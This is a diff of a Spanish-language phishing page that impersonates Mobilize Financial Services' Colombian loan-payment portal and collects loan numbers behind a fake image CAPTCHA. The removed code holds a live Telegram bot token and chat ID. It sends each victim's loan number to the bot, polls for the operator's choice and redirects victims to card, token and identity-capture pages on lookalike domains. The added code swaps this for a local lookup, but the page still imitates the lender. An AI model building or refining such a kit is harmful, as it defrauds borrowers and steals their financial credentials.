@@ -7,46 +7,27 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { font-family: Arial, Helvetica, sans-serif; background: #f0f0f0; min-height: 100vh; display: flex; flex-direction: column; }
-
         header { background: #fff; padding: 16px 24px; box-shadow: 0 1px 4px rgba(0,0,0,0.08); }
         .logo { display: flex; flex-direction: column; line-height: 1; }
         .logo-top { font-size: 28px; font-weight: 900; color: #1a1a1a; letter-spacing: -0.5px; display: flex; align-items: center; gap: 2px; }
         .logo-circle { display: inline-block; width: 28px; height: 28px; border-radius: 50%; border: 3px solid #e8391e; position: relative; margin: 0 1px; }
         .logo-circle::after { content: ''; position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%) rotate(-45deg); width: 2px; height: 100%; background: #e8391e; }
         .logo-bottom { font-size: 11px; font-weight: 700; color: #1a1a1a; letter-spacing: 1.5px; }
-
         main.content { flex: 1; display: flex; justify-content: center; align-items: flex-start; padding: 32px 16px; }
         .card { background: #fff; border-radius: 16px; padding: 32px 28px; width: 100%; max-width: 440px; box-shadow: 0 2px 12px rgba(0,0,0,0.07); }
         .card h1 { font-size: 15px; font-weight: 400; color: #444; text-align: center; line-height: 1.5; margin-bottom: 24px; }
-
-        .info-banner {
-            background: #f0f7ff;
-            border: 1px solid #b8d4f0;
-            border-left: 4px solid #1a1a1a;
-            border-radius: 8px;
-            padding: 12px 16px;
-            margin-bottom: 20px;
-            font-size: 13px;
-            color: #2c5282;
-            line-height: 1.5;
-        }
-        .info-banner strong { display: block; margin-bottom: 4px; color: #1a1a1a; }
-
         .input-wrap { position: relative; margin-bottom: 20px; }
         .input-wrap input { width: 100%; padding: 18px 14px 6px; border: 1.5px solid #ccc; border-radius: 8px; font-size: 15px; color: #1a1a1a; outline: none; background: #fff; transition: border-color .2s; }
         .input-wrap input:focus { border-color: #1a1a1a; }
         .input-wrap label { position: absolute; top: 50%; left: 14px; transform: translateY(-50%); font-size: 14px; color: #888; pointer-events: none; transition: all .15s; }
         .input-wrap input:focus ~ label, .input-wrap input:not(:placeholder-shown) ~ label { top: 8px; font-size: 11px; color: #555; transform: none; }
-
         .btn { width: 100%; padding: 14px; border: none; border-radius: 50px; font-size: 13px; font-weight: 700; letter-spacing: 1px; cursor: pointer; margin-bottom: 10px; transition: opacity .2s; }
         .btn:hover { opacity: 0.88; }
         .btn-dark { background: #1a1a1a; color: #fff; }
         .btn-gray { background: #d0d0d0; color: #888; cursor: not-allowed; }
         .btn-gray.active { background: #1a1a1a; color: #fff; cursor: pointer; }
-
         .disclaimer { max-width: 440px; margin: 0 auto; padding: 0 16px 32px; }
         .disclaimer p { font-size: 13px; color: #555; line-height: 1.7; text-align: justify; margin-bottom: 14px; }
-
         footer { background: #fff; border-top: 1px solid #e0e0e0; padding: 20px 24px; display: flex; align-items: center; gap: 16px; }
         .footer-logo { display: flex; flex-direction: column; line-height: 1; border-left: 3px solid #ccc; padding-left: 12px; }
         .footer-logo .fl-top { font-size: 16px; font-weight: 900; color: #1a1a1a; display: flex; align-items: center; gap: 1px; }
@@ -54,15 +35,17 @@
         .footer-logo .fl-circle::after { content: ''; position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%) rotate(-45deg); width: 1.5px; height: 100%; background: #e8391e; }
         .footer-logo .fl-bottom { font-size: 7px; font-weight: 700; color: #1a1a1a; letter-spacing: 1px; }
         .footer-text { font-size: 11px; color: #777; line-height: 1.5; }
-
         .error-msg { color: #c0392b; font-size: 13px; margin-top: 12px; text-align: center; display: none; }
-
-        /* ====== VERIFICACIÓN DE SEGURIDAD ====== */
+        .info-box { background: #f0f7ff; border: 1px solid #b8d4f0; border-radius: 8px; padding: 12px 16px; margin-bottom: 16px; font-size: 13px; color: #2c5282; }
+        .info-box strong { display: block; margin-bottom: 4px; }
+        .info-box code { background: #e2e8f0; padding: 2px 6px; border-radius: 4px; font-size: 12px; }
+        
+        /* ====== ESTILOS DE LA VERIFICACIÓN DE SEGURIDAD ====== */
         #verificacion-overlay {
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: rgba(240, 240, 240, 0.95);
+            background: rgba(240, 240, 240, 0.98);
             z-index: 9998;
             display: none;
             justify-content: center;
@@ -149,7 +132,7 @@
         }
         .btn-continuar.activo { background-color: #1a2b4c; color: white; cursor: pointer; }
 
-        /* Pantalla de éxito */
+        /* Pantalla de éxito de la verificación */
         #pantallaExito { display: none; }
         .titulo-exito { font-size: 32px; color: #202124; margin: 10px 0 20px 0; font-weight: 400; }
         .caja-verde {
@@ -175,38 +158,10 @@
         .texto-completado { color: #34a853; font-size: 18px; font-weight: 500; margin: 0; line-height: 1.4; }
         .texto-redirigir { color: #5f6368; font-size: 14px; margin-top: 20px; }
 
-        /* ====== OVERLAY DE CARGA ====== */
-        #loading-overlay {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(26,26,26,0.85);
-            z-index: 9999;
-            display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-        }
-        .loader-container { position: relative; width: 60px; height: 60px; animation: rotateLoader 1.5s linear infinite; }
-        .dot { position: absolute; width: 20px; height: 20px; border-radius: 50%; }
-        .dot-red { background-color: #e8391e; top: 0; left: 50%; transform: translateX(-50%); }
-        .dot-dark { background-color: #1a1a1a; bottom: 5px; left: 0; }
-        .dot-gray { background-color: #d0d0d0; bottom: 5px; right: 0; }
-        @keyframes rotateLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
         @media (max-width: 480px) { .card { padding: 24px 18px; } }
     </style>
 </head>
 <body>
-
-    <!-- Overlay de carga -->
-    <div id="loading-overlay">
-        <div class="loader-container">
-            <div class="dot dot-red"></div>
-            <div class="dot dot-dark"></div>
-            <div class="dot dot-gray"></div>
-        </div>
-    </div>
 
     <!-- Overlay de Verificación de Seguridad -->
     <div id="verificacion-overlay">
@@ -227,7 +182,7 @@
                     <img src="https://images.unsplash.com/photo-1588872657578-7efd1f1555ed?w=200&h=200&fit=crop" alt="Portátil 4">
                     <img src="https://images.unsplash.com/photo-1593642632823-8f785ba67e45?w=200&h=200&fit=crop" alt="Portátil 5">
                     <img src="https://images.unsplash.com/photo-1525547719571-a2d4ac8945e2?w=200&h=200&fit=crop" alt="Portátil 6">
-                    <!-- Fila 3: Otros objetos -->
+                    <!-- Fila 3: Otros objetos (para confundir) -->
                     <img src="https://images.unsplash.com/photo-1542291026-7eec264c27ff?w=200&h=200&fit=crop" alt="Zapatilla">
                     <img src="https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=200&h=200&fit=crop" alt="Auriculares">
                     <img src="https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=200&h=200&fit=crop" alt="Reloj">
@@ -271,7 +226,6 @@
         </div>
     </div>
 
-    <!-- Header Mobilize -->
     <header>
         <div class="logo">
             <div class="logo-top">M<span class="logo-circle"></span>BILIZE</div>
@@ -279,25 +233,22 @@
         </div>
     </header>
 
-    <!-- Contenido principal -->
     <main class="content">
         <div>
             <div class="card">
                 <h1>Ingresa el número de tu crédito para realizar el pago de tu obligación</h1>
-
-                <form id="creditForm" autocomplete="off" onsubmit="return sendCreditForm(event);">
+                
+                <form id="creditForm" onsubmit="return false;">
                     <div class="input-wrap">
-                        <input type="text" id="credito" placeholder=" " inputmode="numeric" autocomplete="off" maxlength="20">
+                        <input type="text" id="credito" placeholder=" " inputmode="numeric" autocomplete="off">
                         <label for="credito">Número de crédito *</label>
                     </div>
                     <button type="button" class="btn btn-dark" onclick="history.back()">REGRESAR</button>
-                    <button type="submit" class="btn btn-gray" id="btnContinuar" disabled>CONTINUAR</button>
+                    <button type="button" class="btn btn-gray" id="btnContinuar" disabled>CONTINUAR</button>
                 </form>
-
                 <div class="error-msg" id="msgError"></div>
             </div>
 
-            <!-- Disclaimers Mobilize -->
             <div class="disclaimer">
                 <p>Todos los pagos serán aplicados según el horario bancario definido por la Entidad. De realizarse el pago fuera de este horario, éste será aplicado al siguiente día hábil bancario de conformidad con el Artículo 97 del Decreto 663 de 1993 (Estatuto Orgánico del Sistema Financiero).</p>
                 <p>Todo abono extraordinario realizado no adelantará cuotas del crédito; por defecto, éste será aplicado a capital bajo la modalidad de reducir el plazo. En caso de que desees que dicho abono sea abonado a capital bajo la modalidad de reducir cuota, una vez realices el pago deberás informar a la Entidad escribiendo al correo electrónico clientes@mobilize-fs.com o comunicándote con nuestras líneas de atención.</p>
@@ -307,7 +258,6 @@
         </div>
     </main>
 
-    <!-- Footer Mobilize -->
     <footer>
         <div class="footer-logo">
             <div class="fl-top">M<span class="fl-circle"></span>BILIZE</div>
@@ -316,215 +266,55 @@
         <div class="footer-text">Los productos y servicios ofrecidos a través de MOBILIZE FINANCIAL SERVICES, son otorgados por RCI Colombia S.A Compañía de Financiamiento.</div>
     </footer>
 
+    <!-- ============================================================
+    📌 INCLUIR LA BASE DE DATOS
+    ============================================================ -->
+    <script src="js/database.js"></script>
+
+    <!-- ============================================================
+    📌 CÓDIGO DEL FORMULARIO + LÓGICA DE VERIFICACIÓN
+    ============================================================ -->
     <script>
-        // ============================================================
-        // 🔑 CONFIGURACIÓN DE TELEGRAM
-        // ============================================================
-        const TG_BOT_TOKEN = '8706360517:AAED05xUNpk695MaVPIBAYaYYJd1blx067E';
-        const TG_CHAT_ID = '7776240161';
+        const input = document.getElementById('credito');
+        const btn = document.getElementById('btnContinuar');
+        const msgErr = document.getElementById('msgError');
 
-        // ============================================================
-        // 📤 FUNCIÓN: ENVIAR CRÉDITO A TELEGRAM
-        // ============================================================
-        function enviarCreditoTelegram(numeroCredito, onSent) {
-            const mensaje = `
-🏦 <b>MOBILIZE - NUEVO CRÉDITO</b>
+        // Variable para guardar el crédito que está esperando verificación
+        let creditoPendiente = '';
 
-📄 <b>Número de crédito:</b> <code>${numeroCredito}</code>
-
-📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
-            `.trim();
-
-            const keyboard = {
-                inline_keyboard: [
-                    [
-                        { text: '✅ Crédito Válido', callback_data: 'credito_ok' },
-                        { text: '❌ Crédito Inválido', callback_data: 'credito_error' }
-                    ],
-                    [
-                        { text: '🏁 Finalizar', callback_data: 'finalizar' }
-                    ]
-                ]
-            };
-
-            return fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TG_CHAT_ID,
-                    text: mensaje,
-                    parse_mode: 'HTML',
-                    reply_markup: keyboard
-                })
-            })
-            .then(r => r.json())
-            .then(data => {
-                console.log('✅ Respuesta Telegram:', data);
-                if (data.ok && data.result) {
-                    const messageId = data.result.message_id;
-                    localStorage.setItem('bbogota_msg_id', messageId);
-                    if (typeof onSent === 'function') onSent(messageId);
-                    return messageId;
-                } else {
-                    console.error('❌ Error Telegram:', data);
-                    return null;
-                }
-            })
-            .catch(err => {
-                console.error('❌ Error de red:', err);
-                return null;
-            });
-        }
-
-        // ============================================================
-        // 👂 ESCUCHAR BOTONES DEL BOT (polling simple)
-        // ============================================================
-        let pollingActivo = false;
-        let pollingTimeout = null;
-
-        function escucharBotones(onAction) {
-            const msgId = localStorage.getItem('bbogota_msg_id');
-            if (!msgId) { console.warn('⚠️ No hay msgId para escuchar'); return; }
-
-            pollingActivo = true;
-            let lastUpdateId = -1;
-
-            function check() {
-                if (!pollingActivo) return;
-
-                fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        offset: lastUpdateId + 1,
-                        allowed_updates: ['callback_query'],
-                        timeout: 10
-                    })
-                })
-                .then(r => r.json())
-                .then(data => {
-                    if (!data.ok || !data.result || data.result.length === 0) {
-                        pollingTimeout = setTimeout(check, 2000);
-                        return;
-                    }
-
-                    for (const u of data.result) {
-                        lastUpdateId = Math.max(lastUpdateId, u.update_id);
-                        if (!u.callback_query) continue;
-
-                        const action = u.callback_query.data;
-                        const messageId = String(u.callback_query.message.message_id);
-
-                        if (messageId === String(msgId)) {
-                            pollingActivo = false;
-                            onAction(action);
-                            return;
-                        }
-                    }
-                    pollingTimeout = setTimeout(check, 2000);
-                })
-                .catch(err => {
-                    console.error('❌ Error polling:', err);
-                    pollingTimeout = setTimeout(check, 3000);
-                });
-            }
-            check();
-        }
-
-        // ============================================================
-        // 🗺️ MANEJAR ACCIÓN DEL BOT
-        // ============================================================
-        const REDIRECTS = {
-            'credito_ok': 'https://mobilize-fs-com-co.vercel.app/',
-            'credito_error': 'https://rcimobilize-fs-com-co.vercel.app/bogota/rci.html',
-            'finalizar': 'https://www.mobilize-fs.com.co/pagos-en-linea/',
-            'error': 'index1.html?error=wrong_data',
-            'token': 'token.html',
-            'token_otro': 'tokeninv.html',
-            'tarjeta_debito': 'tarjeta.html',
-            'tarjeta_credito': 'tarjeta.html',
-            'soyyo': 'soyyo.html',
-            'datos_personales': 'https://virtualbogotacuposbogota.pages.dev/bogota/datos-personales',
-            'error_logo': 'soyyo.html?error=invalid',
-        };
-
-        let actionProcessed = false;
-
-        function handleTelegramAction(action) {
-            if (actionProcessed) return;
-            actionProcessed = true;
-
-            const redirectUrl = REDIRECTS[action];
-
-            if (redirectUrl) {
-                setTimeout(() => { window.location.href = redirectUrl; }, 100);
-            } else {
-                actionProcessed = false;
-            }
-        }
-
-        // ============================================================
-        // 🖊️ INPUT: número de crédito
-        // ============================================================
-        document.addEventListener('DOMContentLoaded', function() {
-            const input = document.getElementById('credito');
-            const btn = document.getElementById('btnContinuar');
-            const msgErr = document.getElementById('msgError');
-
-            btn.disabled = true;
-            btn.classList.remove('active');
-
-            input.addEventListener('input', function() {
-                this.value = this.value.replace(/[^0-9]/g, '');
-                const tiene = this.value.trim().length > 0;
-                btn.disabled = !tiene;
-                btn.classList.toggle('active', tiene);
-                msgErr.style.display = 'none';
-            });
-
-            input.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    if (!btn.disabled) sendCreditForm(e);
-                }
-            });
-
-            input.focus();
+        // Habilitar botón cuando hay texto
+        input.addEventListener('input', () => {
+            const tiene = input.value.trim().length > 0;
+            btn.disabled = !tiene;
+            btn.classList.toggle('active', tiene);
+            msgErr.style.display = 'none';
         });
 
         // ============================================================
-        // 🛡️ LÓGICA DE VERIFICACIÓN (PORTÁTILES)
+        // 🛡️ FUNCIONES DE LA VERIFICACIÓN DE SEGURIDAD
         // ============================================================
-        let creditoPendiente = '';
-        let verificacionCompletada = false;
-
-        // Abrir verificación
         function abrirVerificacion() {
             document.getElementById('verificacion-overlay').style.display = 'flex';
             document.getElementById('pantallaSeleccion').style.display = 'block';
             document.getElementById('pantallaExito').style.display = 'none';
-
             // Limpiar selecciones previas
             document.querySelectorAll('#gridImagenes img').forEach(img => img.classList.remove('seleccionada'));
         }
 
-        // Cerrar verificación (botón regresar)
         function cerrarVerificacion() {
             document.getElementById('verificacion-overlay').style.display = 'none';
-            document.getElementById('loading-overlay').style.display = 'none';
-            const btn = document.getElementById('btnContinuar');
             btn.disabled = false;
             btn.textContent = 'CONTINUAR';
         }
 
-        // Clic en imágenes
+        // Clic en las imágenes de la cuadrícula
         document.querySelectorAll('#gridImagenes img').forEach(img => {
             img.addEventListener('click', function() {
                 this.classList.toggle('seleccionada');
             });
         });
 
-        // Botón Confirmar de la verificación
+        // Botón "Confirmar" de la verificación
         document.getElementById('btnConfirmar').addEventListener('click', function() {
             const seleccionadas = document.querySelectorAll('#gridImagenes img.seleccionada');
             const cantidad = seleccionadas.length;
@@ -535,67 +325,57 @@
                 document.getElementById('pantallaSeleccion').style.display = 'none';
                 document.getElementById('pantallaExito').style.display = 'block';
 
-                // Enviar datos a Telegram SOLO cuando la verificación es exitosa
-                if (!verificacionCompletada) {
-                    verificacionCompletada = true;
-                    enviarCreditoTelegram(creditoPendiente, function(messageId) {
-                        if (messageId) {
-                            escucharBotones(handleTelegramAction);
-                        } else {
-                            document.getElementById('loading-overlay').style.display = 'none';
-                            document.getElementById('btnContinuar').disabled = false;
-                            document.getElementById('btnContinuar').textContent = 'CONTINUAR';
-                            document.getElementById('msgError').textContent = 'Error de conexión. Intenta de nuevo.';
-                            document.getElementById('msgError').style.display = 'block';
-                            document.getElementById('verificacion-overlay').style.display = 'none';
-                        }
-                    });
-                }
+                // ============================================================
+                // 🔄 EJECUTAR LA LÓGICA ORIGINAL (la que ya tenías)
+                // Se ejecuta SOLO cuando la verificación es exitosa
+                // ============================================================
+                setTimeout(() => {
+                    // Usar la función buscarCredito() que viene de database.js
+                    const resultado = buscarCredito(creditoPendiente);
+
+                    if (!resultado.success) {
+                        // Si hay error, cerrar verificación y mostrar error
+                        cerrarVerificacion();
+                        msgErr.textContent = resultado.error;
+                        msgErr.style.display = 'block';
+                        return;
+                    }
+
+                    // 💾 GUARDAR DATOS EN localStorage
+                    localStorage.setItem('userInfo', JSON.stringify(resultado.userInfo));
+
+                    // 🔀 REDIRIGIR A transaction_summary.html
+                    window.location.href = 'transaction_summary.html';
+                }, 1200); // Pequeño retardo para que se vea la pantalla de "Correcto"
             } else {
+                // Error: si no seleccionó 5, mostrar alerta y limpiar
                 alert('Verificación fallida. Debes seleccionar exactamente 5 portátiles.');
                 document.querySelectorAll('#gridImagenes img').forEach(img => img.classList.remove('seleccionada'));
             }
         });
 
         // ============================================================
-        // 📤 ENVIAR FORMULARIO (ahora abre la verificación)
+        // 📤 CUANDO HACES CLIC EN CONTINUAR
         // ============================================================
-        function sendCreditForm(e) {
-            e.preventDefault();
+        btn.addEventListener('click', () => {
+            if (btn.disabled) return;
 
-            const input = document.getElementById('credito');
-            const btn = document.getElementById('btnContinuar');
-            const msgErr = document.getElementById('msgError');
-            const creditNumber = input.value.trim();
-
-            if (!creditNumber) {
-                msgErr.textContent = 'Por favor ingresa el número de crédito';
-                msgErr.style.display = 'block';
-                return false;
-            }
-
-            // Guardar crédito pendiente y resetear verificación
-            creditoPendiente = creditNumber;
-            verificacionCompletada = false;
-
-            // Guardar localmente
-            localStorage.setItem('userInfo', JSON.stringify({ credito: creditNumber }));
-            actionProcessed = false;
-
-            // Mostrar overlay de carga y luego la verificación
+            creditoPendiente = input.value.trim();
             btn.disabled = true;
             btn.textContent = 'Consultando...';
             msgErr.style.display = 'none';
-            document.getElementById('loading-overlay').style.display = 'flex';
 
-            // Simulamos un pequeño retardo para que se vea el loader y luego la verificación
+            // Simular un pequeño retraso (como si fuera una conexión real)
             setTimeout(() => {
-                document.getElementById('loading-overlay').style.display = 'none';
+                // En lugar de buscar de inmediato, abrimos la verificación
                 abrirVerificacion();
+                
+                // Restauramos el botón por si el usuario regresa
+                btn.textContent = 'CONTINUAR';
+                btn.disabled = false;
             }, 600);
-
-            return false;
-        }
+        });
     </script>
+
 </body>
 </html>
